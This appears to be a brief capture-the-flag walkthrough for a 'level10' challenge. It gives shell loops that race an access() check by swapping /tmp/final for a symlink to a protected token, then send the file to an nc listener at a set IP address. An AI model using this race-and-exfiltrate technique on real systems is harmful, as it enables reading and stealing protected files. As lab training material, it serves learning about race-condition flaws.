https://askubuntu.com/questions/301787/opening-a-port-for-listening


First ssh terminal: `while true; do (./level10 /tmp/final 10.11.200.134); done`

Second ssh terminal: `while true; do nc -l 6969 ;done`

`readlink -f token` to know true token path

third ssh terminal: `while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done`

If you don't rm and touch /tmp/final the symlink is on put final and you ./level10 will say you don't have access to /tmp/final, you need a new file created by you to pass the access() check and then apply symlink to /tmp/final
